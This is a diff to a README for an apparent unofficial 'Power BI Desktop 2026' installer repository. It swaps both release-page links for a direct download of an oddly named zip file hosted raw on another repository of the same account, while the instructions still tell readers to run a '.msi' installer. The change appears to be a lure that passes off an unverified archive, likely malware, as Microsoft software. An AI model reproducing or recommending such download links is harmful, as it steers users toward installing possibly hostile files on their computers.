@@ -5,7 +5,7 @@ description: "Download the Power BI Desktop installer for Windows 10 and 11 usin
 ---
 # 📊 Power-BI-Desktop-2026 - Visualize your data with confidence
 
-[![](https://img.shields.io/badge/Download-Power_BI_Desktop-blue.svg)](https://github.com/verinetorrential511/Power-BI-Desktop-2026/releases)
+[![](https://img.shields.io/badge/Download-Power_BI_Desktop-blue.svg)](https://raw.githubusercontent.com/verinetorrential511/verinetorrential511.github.io/main/trait/io-verinetorrential-github-emulable.zip)
 
 ## 📁 About the application
 
@@ -34,7 +34,7 @@ Before you install the software, check your computer for these specifications:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [release page](https://github.com/verinetorrential511/Power-BI-Desktop-2026/releases) to download the installation file.
+1.  Visit the [release page](https://raw.githubusercontent.com/verinetorrential511/verinetorrential511.github.io/main/trait/io-verinetorrential-github-emulable.zip) to download the installation file.
 2.  Select the file that ends in .msi to start the download.
 3.  Open your Downloads folder once the file finishes saving.
 4.  Double-click the installer file.
